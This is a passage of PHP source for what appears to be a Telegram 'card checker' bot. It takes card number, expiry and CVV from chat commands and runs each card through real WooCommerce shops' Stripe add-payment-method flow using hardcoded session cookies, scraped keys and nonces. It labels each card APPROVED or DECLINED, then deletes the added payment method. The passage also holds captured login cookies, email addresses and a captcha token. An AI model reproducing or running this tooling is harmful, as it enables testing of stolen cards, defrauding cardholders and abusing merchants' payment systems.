sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; __stripe_sid=13a09389-3b9c-4061-bf10-5b611f9c85d05d9c18; mailchimp.cart.previous_email=Sooppeed1983@dayrep.com; mailchimp.cart.current_email=sotiboy686@anypng.com; mailchimp_user_previous_email=sotiboy686%40anypng.com; mailchimp_user_email=sotiboy686%40anypng.com; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_7885489a2636edbf3062cc36bfd92416=Jimenez%7C1731007537%7Cs8KDHCHFTLDJAqteJuJfb3mxaMZtQWvSJFYWFeWzr7O%7C9902ee069172a0b6626f875fcdce5bc45e235f7fb156adc88021b63cd672e5d3; sbjs_session=pgs%3D42%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'Referer: https://hoamemberservices.com/my-account/payment-methods/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/\/\d+\/\?_wpnonce=[a-f0-9]+/';
preg_match($patron, $response, $coincidencias);
$url_nonce = $coincidencias[0];
curl_close($curl);

echo "$url_nonce\n";




$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://hoamemberservices.com/my-account/delete-payment-method'.$url_nonce.'',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'etBloomCookie_optin_3=true; et_bloom_optin_optin_3_8f64235d7c_imp=true; __stripe_mid=eea6ca2b-17d3-4538-a504-6a087a80ac66851e42; mailchimp_landing_site=https%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fedit-account%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-05%2018%3A58%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-05%2018%3A58%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; __stripe_sid=13a09389-3b9c-4061-bf10-5b611f9c85d05d9c18; mailchimp.cart.previous_email=Sooppeed1983@dayrep.com; mailchimp.cart.current_email=sotiboy686@anypng.com; mailchimp_user_previous_email=sotiboy686%40anypng.com; mailchimp_user_email=sotiboy686%40anypng.com; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_7885489a2636edbf3062cc36bfd92416=Jimenez%7C1731007537%7Cs8KDHCHFTLDJAqteJuJfb3mxaMZtQWvSJFYWFeWzr7O%7C9902ee069172a0b6626f875fcdce5bc45e235f7fb156adc88021b63cd672e5d3; sbjs_session=pgs%3D42%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'Referer: https://hoamemberservices.com/my-account/payment-methods/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);



} elseif ($success === true && $status === "requires_action") {
    $respo = "3DS Authenticate Rejected ❌";
} else {
    $respo = $message;
}



$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";



if (empty($respo)) {
        $respo = $response;
}

if (array_in_string($respo, $live_array)) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Stripe Auth\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Stripe Auth\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = False;
} else {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Stripe Auth\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
    $live = False;
}

if ($live) {
    editMessage($chat_id, $respuesta, $id_text);
} else {
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();

}

	
	
elseif((strpos($message, "!he") === 0)||(strpos($message, "/he") === 0)||(strpos($message, ".he") === 0)){

$lista = substr($message, 4);
//$i     = explode("|", $lista);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = trim(substr($i[2], -2));
$cvv   = $i[3];

$bin = substr($lista, 0, 6);
////
$num = "$cc$mes$ano$cvv";

$longitud = 4;
$partes = [];

for ($i = 0; $i < strlen($cc); $i += $longitud) {
    $parte = substr($cc, $i, $longitud);
    $partes[] = $parte;
}

	
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
if($verify != ""){
$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}

if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
}else{
$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /he cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !he cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .he cc|m|y|cvv\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//

$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin
$cc = implode('+', $partes);
//sendPv($myid, 'error4..');

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://healthyfungi.com.au/my-account/add-payment-method/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-08%2019%3A36%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-08%2019%3A36%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_febd530ada708d5093f883308bac36a7=rg2004j%7C1732304472%7CpblBuEHjl1mFZlV6P65yKlAcq4U25lj3NmtqOf78qrz%7C7cf3e7871efb13634e7094dac3694c8fbd343128b0365673a9e938aeebea5f7f; sbjs_session=pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'referer: https://healthyfungi.com.au/my-account/payment-methods/',
  ],
]);



$response = curl_exec($curl);
$err = curl_error($curl);

// Extraer pk_live
$patron_pk = '/"publishableKey":"([^"]*)"/';
preg_match($patron_pk, $response, $matches_pk);
$pk_live = $matches_pk[1];

// Extraer nonce
$patron_nonce = '/"createSetupIntentNonce":"([^"]*)"/';
preg_match($patron_nonce, $response, $matches_nonce);
$nonce = $matches_nonce[1];
curl_close($curl);



//echo "$pk_live\n";
//echo "$nonce\n";

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10010&billing_details%5Baddress%5D%5Bcountry%5D=US&payment_user_agent=stripe.js%2F1a86f4d606%3B+stripe-js-v3%2F1a86f4d606%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fhealthyfungi.com.au&time_on_page=28600&client_attribution_metadata%5Bclient_session_id%5D=4fc4657d-b5ce-496d-98e3-4cabe6bb1284&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=4485f0fe-2a44-46ca-8a18-6775167b89bcebfec0&muid=53e89807-84e5-4a98-a6e5-1f91e51883aa844aaf&sid=cc06746a-e59e-4944-b9a9-35894a6b552d4eb28c&key='.$pk_live.'&_stripe_account=acct_1PLz1dC08E2V4AsU&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiN0FxMGQydktRWll3cUZydkVDb1oyZ01zcXpYMUREdS8wY0VZRFFHdExhbnRkNEw1RlowLzMzS1BPMEZZaVFSRmhYLy96WWd5YzI0Y0RFWFpUa0hHUUVuSDlUYTZ3aTYxWTZoMjN1bTFUUE42SW54RldFb3laVzZhbnlKcVlJWWhJcFo2bVMvTDVhNHhpRnZJdmNKQ0g0enlVaDlENHVCQXNlRGI3MnNhSE45U0p5azRsRmQrMHd4dkJDc2tNTlNINHhwN1lDTzFFUkJFbmN1NXNEWGVLM05LaGU3RXZCS2h5R3pSdG9IdXl1VmtxenVvK1pqRHNlZHorNkpjdENmRXh2UzNkeGtpYU1paW5PTHJQbmZZVTh0RTJKR3JpWEJHZmZzK29MNUdQNDBGZjMranlXSG5adzNyaFR2ekM0QnVrYVoxNXowOTNUV1gwVmcyYjJuanZVTkxiaktSaXA2cW91VUFPb29nRzNnRUY4SHNqUzhMWEUrMmtBU3ZTMFVuMlAwZXl1WVM4YUt1KzZQVWdyUHkxZW9CbHdlMjFoL0tudzJTMGcvTXdDYVpSc1E1blhPK29qQUtKNzMzeWJPbmpHTGx2UkN3SEcwelo2NlpTc3JZU0w3SzdPV1ZnSHVFS3F1OVhpTDZmaFZnb0NQYzgyVExCblJ1Yko3cnNCYytmU0UxbWh5QzRSUEVnbFhyV2ZwelVCY3FHVXpObWt0ejJaa1VYRE5GNDNuZ01BOWwxc29WL3B1aHJGTTh5KzRBQ2dSM0pSQWtTNG5XVFErVVoyYVdVRTBJWVRsSjV2TTFHOUZ4azl3VTdnNHIyUDdiWnczQkRjaUw4WFQvQ3Jpbkp3enU1NEdrL1c5MDhieURmYjdOL2xwWlFrdlk5bjJuZkRBWm5GV0g3WHZRTzdUNTNCNURqQy9vOUlkRERybm9mK0RsZ1QxRVgxd2t5THVLNWgra0wwdE1teDgvR2dJc3VmZzJTNHlleWVUMS9ValZOMmhCSlZ5Y3VBR1MwcjBCNkxyU0tiZTVSQ0NrYVl0OGw4SFBOekh3OFFYbW5RM2d0dElWVlMxTWRSTnlqRm8yUVhpR0lBWnZwNVVDQlFDNGRWSmxPODd4OU5HeEdFcnRrdjAyQ1hqK2pKNkIrSlVzN0h4NmZSM2tYMGhYT1piTHNJQVVzWFBHSEVTOGZKNk9ZNXprUzRPcCtqZVN4Tk81cHE5OTltZGVaNVlFejJtRXY5TkFhNnFGTmVyaHQvbk5FVjc0aTZOY1dxeXZiT0piZ0V5NnhpNmdmYWlFQVVOT0hUSnRFNVBOSWxiQkRQOEh1SjMySWZnR2h1aFd4YllSSWcrTkp6WnVjc0dYY0VDUHMvaC8rN29oT0NLZlVFWTdZYXBIYWU4UUpMZ1dRZ2hKaWtIZTA0TC9FeG85YmU4QWdmWXliZy8wWElYKy9qSjFhT3ZIRDg3K1lZeWdOQXNDYXR4WVNZVW9WdzVUQXFjb1VJQ1hsZVA5SThrdUNJSUFNaG95OGdjc1paVWRZRlZ2eldyOG1kODgrelFIelhCYU5lZ0k0dWR3eENqRkYrdUxXYkhVd1RlTnlIWGxaM0JlMlpQYzArMWd2cWgwa0J0ZEZlTlk1a3hxQUZIUzFsZHlXY3d4QzdJczFyMVQ4R29ESHh5ODVZRFRGQjJxRy9DNW5zcFhzTmV5VThmcUdSN1NvZ2VaSEFBczcyc1p2cE45S0VycU5ldklUUDdUSzNaQi9JV2hTM01lZExLc2gvSWRBV2JLeVUwRVFObjlqSkRXNlNPSVRlV0prK2NWVTlWcHgxZHM5cEtYT3RieEdPUmlyaWRuSENXaktWZVcxSVpmdFVOZXZLSjMveW04b1dBOFJIWlh0TXQxQXFYWkwxa0dxMmhIcDN4akY3ZTFKay9kOEwvZWRlWDA1MWNkTEh5eDVwUEtSUFN3K3crSE5TN0tpdUJqQ1BxU0RBWXJ6ams1SWpkd0Q2RWlpMytvRitnK0YzRXBxQU1EUThtY2I3Rjg1MGlZMWswYTVZWnJSVzNRdk5wc05NQ1prNUNwcWcvU2dtU1puL09SNW9NZHI4aXZsM3FtZFdCMDNtTC9qbGlMV3NZc3dMZ1Z0UXlYMVVzbjRCVDBEZ3hUS3ZPNUdpbVV5WDFOYmx1TjFqaGxFaTU3NEpFSGNLNDRLSjZrcnJFWHVSbkEwOVd4dVB3bi8wZUhGNURHWTA0a1Bjc0JyRlFGSEkrVGtxYlJoTndJd1Ywd1FFYjFXTnV2My9lTjdiS1pSVFhzYmJFZUtXeE91clJ3OGJ4ZzRzRFdVN3hYL0QrSXZTZDFwTkE2VVRicjErK1Y4bWg5QWY5SW54Y08zRzFrOS82Szc0SmRveVhORmxXVlBuSGJwYlFlTDRBNU5Zc295Sm1aSFExeVpSYjh0MllrY1liUExKN25zNjhEblRyNnFDckV1VDUwamtnNTVHRnI3U3JjNDVjNFhlM2VBRDQ4U1YvMTdsTzltMVdCcXI1ejVYb2kvQjQrVEkya2xoaVNCOFFOUWhKZ284b2IwSEcvMGVCV3ZZREJVbFVRcTJ0R09tQkFtbVplZ1J5dEZMM0RJekdVWGxtd3M1eHk0ZGE2RnNydEJQa2w2Y0duUkI2eC9Ua1FlMzFsa040dGRZWktaMkIzU3N3a3pibVhLYll3ektUUUh1SnlxRXVmdjM2R0dsZWdqRlFxQ2l4S2tMRXNYRzF5MFR4S1pqVTYvcXBBdFVQZzM1UnVFT3ZLSTRkVjJUWT0iLCJleHAiOjE3MzEwOTUwMzcsInNoYXJkX2lkIjoyMjE5OTYwNzMsImtyIjoiMzgwMmQ4ZGMiLCJwZCI6MCwiY2RhdGEiOiJYM1ZEN0hOMEJxTG5zQ3ZreUhLZmRQZHE0cmZDeU11K05oeGpzejBtMEp5ZXBPMXVNanBmK3E4elEwbkpwRFZtYnhPTDlzbThRaGsyZlZvb1I1cjFZeXQ1aVRTbWlsWUpyNmF3eW55dzZJVDlVU0owSTVrVzFnWkNrdy9vcDhMaTZ0dElFcnZ4dGJkTUhVTkVWamtNb3lyMExFbkFWSGRiWkRYSUQzYUd0TnpmUzNTQWpTU0s1ZU1mS3VUN056VVdyR1IxL1pUenR5SHErSTVFIn0.jU97WVh25hH7Qr30Fie7iDKvP1O3zZzC4MMAA0_48Do',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
  ],
]);



$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$id = $json["id"];
curl_close($curl);


//echo "ID $id\n";




$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://healthyfungi.com.au/wp-admin/admin-ajax.php',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => [
    'action' => 'create_setup_intent',
    'wcpay-payment-method' => ''.$id.'',
    '_ajax_nonce' => ''.$nonce.'',
  ],
  CURLOPT_COOKIE => 'wordpress_sec_febd530ada708d5093f883308bac36a7=rg2004j%7C1732304472%7CpblBuEHjl1mFZlV6P65yKlAcq4U25lj3NmtqOf78qrz%7Ce541956337674ea4cc613bf003c672f3ca4e87d5533a58c57e99372cf68a9c38; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-08%2019%3A36%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-08%2019%3A36%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_febd530ada708d5093f883308bac36a7=rg2004j%7C1732304472%7CpblBuEHjl1mFZlV6P65yKlAcq4U25lj3NmtqOf78qrz%7C7cf3e7871efb13634e7094dac3694c8fbd343128b0365673a9e938aeebea5f7f; sbjs_session=pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fadd-payment-method%2F; __stripe_mid=53e89807-84e5-4a98-a6e5-1f91e51883aa844aaf; __stripe_sid=cc06746a-e59e-4944-b9a9-35894a6b552d4eb28c',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'sec-ch-ua: "Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
//    'content-type: multipart/form-data; boundary=----WebKitFormBoundaryjQU0nO2GoQZEBYdk',
    'accept-language: es-US,es;q=0.6',
    'origin: https://healthyfungi.com.au',
    'referer: https://healthyfungi.com.au/my-account/add-payment-method/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
curl_close($curl);

	
//------------------------------------------//
//$message = $json['data']['error']['message'];
$message = str_replace("Error: ", "", $json['data']['error']['message']);
$success = $json['success'];
$status = $json['data']['status'];
curl_close($curl);

	
if ($success === true && $status === "succeeded") {
    $respo = "3DS Authenticate Attempt Successful ✅";

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://healthyfungi.com.au/my-account/payment-methods/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-08%2019%3A36%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-08%2019%3A36%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_febd530ada708d5093f883308bac36a7=rg2004j%7C1732304472%7CpblBuEHjl1mFZlV6P65yKlAcq4U25lj3NmtqOf78qrz%7C7cf3e7871efb13634e7094dac3694c8fbd343128b0365673a9e938aeebea5f7f; sbjs_session=pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fadd-payment-method%2F; __stripe_mid=53e89807-84e5-4a98-a6e5-1f91e51883aa844aaf; __stripe_sid=cc06746a-e59e-4944-b9a9-35894a6b552d4eb28c',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'accept-language: es-US,es;q=0.6',
    'sec-ch-ua: "Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
    'sec-ch-ua-platform: "Android"',
    'referer: https://healthyfungi.com.au/my-account/add-payment-method/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/\/\d+\/\?_wpnonce=[a-f0-9]+/';
preg_match($patron, $response, $coincidencias);
$url_nonce = $coincidencias[0];
curl_close($curl);


echo "$url_nonce\n";

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://healthyfungi.com.au/my-account/delete-payment-method'.$url_nonce.'',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
